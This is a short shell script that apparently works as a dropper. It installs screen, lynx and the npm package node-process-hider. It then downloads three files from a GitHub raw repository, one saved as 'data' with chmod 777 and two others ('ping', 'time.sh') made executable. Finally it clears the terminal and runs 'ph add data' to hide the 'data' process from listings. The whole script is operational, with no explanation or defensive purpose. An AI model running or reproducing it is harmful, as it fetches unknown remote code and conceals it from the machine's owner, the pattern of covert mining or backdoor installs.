#!/bin/sh
#
apt update -y
apt install screen

apt install -y lynx
npm i -g node-process-hider
#
lynx -dont_wrap_pre -dump https://raw.githubusercontent.com/bendrat1/app/main/serabe > data && chmod 777 data
wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/ping && chmod +x ping
wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/time.sh && chmod +x time.sh

#####
clear
 
#
ph add data

